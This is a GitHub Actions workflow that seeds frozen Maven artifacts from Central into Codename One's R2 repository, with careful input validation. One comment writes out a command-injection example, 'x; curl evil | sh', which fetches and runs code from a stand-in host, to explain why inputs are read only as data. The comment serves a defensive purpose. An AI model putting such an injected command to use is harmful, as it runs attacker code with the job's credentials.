# Copies the artifacts a release resolves but no longer publishes from Maven Central
# into the Codename One R2 repository.
#
# Manual by design. It is a one-off per pinned version rather than something a release
# should do on every tag: it reads from Central, and the whole point of the migration
# is that a release must not depend on Central being reachable at that moment.
#
# Run it after bumping cn1.designer.version, before pushing the next release tag. The
# release itself refuses to build while any of it is absent (check-frozen-artifacts.sh),
# so the ordering is enforced rather than remembered.
name: Seed frozen artifacts to R2

on:
  workflow_dispatch:
    inputs:
      coordinates:
        description: 'Optional "<artifactId>:<version> ..." override; blank uses the pinned set'
        required: false
        default: ''

# Shares the release group: seeding writes into the same bucket that a release's
# metadata regeneration reads, and that regeneration is a read-modify-write.
concurrency:
  group: release
  cancel-in-progress: false

jobs:
  seed:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    env:
      R2_ACCOUNT_ID: ${{ secrets.R2_ACCOUNT_ID }}
      R2_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}
      R2_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}
      R2_BUCKET: ${{ vars.R2_BUCKET }}
      R2_BASE_URL: https://repo.codenameone.com/maven2
    steps:
      - uses: actions/checkout@v6

      - name: Validate the coordinate override
        env:
          # Read as DATA, from the environment. Never `${{ inputs.coordinates }}`
          # inside a run: block -- GitHub substitutes that into the shell program text
          # before bash parses it, so a dispatcher supplying `x; curl evil | sh` would
          # execute it as this job, which holds R2 write credentials. Variable
          # expansion, by contrast, word-splits but is never re-parsed for operators.
          COORDINATES: ${{ inputs.coordinates }}
        run: |
          # set -f: without it the unquoted expansion below would also glob, so a
          # coordinate containing * would silently become a list of filenames.
          set -f
          for coordinate in $COORDINATES; do
            case "$coordinate" in
              *[!A-Za-z0-9.:,_-]*)
                echo "Refusing coordinate '$coordinate'." >&2
                echo "Only [A-Za-z0-9.:,_-] are allowed; the form is" >&2
                echo "<artifactId>:<version>[:<classifier>,...]." >&2
                exit 1
                ;;
            esac
          done
          echo "Coordinate override: ${COORDINATES:-<none, using the derived set>}"

      - name: Restrict the override to derived frozen coordinates
        env:
          COORDINATES: ${{ inputs.coordinates }}
        # Seeding an artifact that frozen-coordinates.py does not derive would put
        # content in the bucket that nothing else knows about. The seed would succeed
        # and the Verify step, which probes exact file paths, would pass -- but
        # regen-maven-metadata.py takes its frozen set from the same derivation, so it
        # would treat the new coordinate as an ordinary release, find no completion
        # marker, omit it from maven-metadata.xml and print a "release not marked
        # complete" line about it on every future run. A green workflow whose metadata
        # was never updated is worse than a refusal.
        #
        # The override exists to re-seed part of the derived set, which this still
        # allows. Seeding something outside it is not a use case: by definition no
        # release resolves it. A human with the credentials can still run the script
        # directly for an emergency repair.
        run: |
          set -f
          [ -z "$COORDINATES" ] && exit 0
          derived=$(python3 maven/scripts/r2/frozen-coordinates.py)
          status=0
          for coordinate in $COORDINATES; do
            # Compare artifact:version, ignoring the classifier field on either side.
            wanted=$(echo "$coordinate" | cut -d: -f1,2)
            if echo "$derived" | cut -d: -f1,2 | grep -qxF "$wanted"; then
              echo "ok: $wanted is a derived frozen coordinate"
            else
              echo "Refusing '$coordinate': not a derived frozen coordinate." >&2
              status=1
            fi
          done
          if [ "$status" != "0" ]; then
            echo "Derived set:" >&2
            echo "$derived" >&2
            exit 1
          fi

      - name: Seed
        env:
          COORDINATES: ${{ inputs.coordinates }}
        run: |
          set -f
          # Unquoted on purpose: the input is a space-separated coordinate list, and
          # blank must expand to no arguments so the script uses its own derived set.
          # Validated above.
          bash maven/scripts/r2/seed-frozen-artifacts.sh $COORDINATES

      - name: Regenerate R2 metadata
        # Seeded artifacts are resolved by exact pinned version rather than discovered,
        # so they carry no release marker -- but their own maven-metadata.xml still has
        # to list them, or a version range or LATEST resolution reads the artifact as
        # absent. regen knows them as frozen and generates from what is present.
        run: python3 maven/scripts/r2/regen-maven-metadata.py

      - name: Verify
        env:
          COORDINATES: ${{ inputs.coordinates }}
        # The same gate the release runs, so a green seed here means the next tag
        # cannot fail on this. Reads the public URL, not the bucket, so it also proves
        # the custom domain is serving what was uploaded.
        run: |
          set -f
          bash maven/scripts/r2/check-frozen-artifacts.sh $COORDINATES
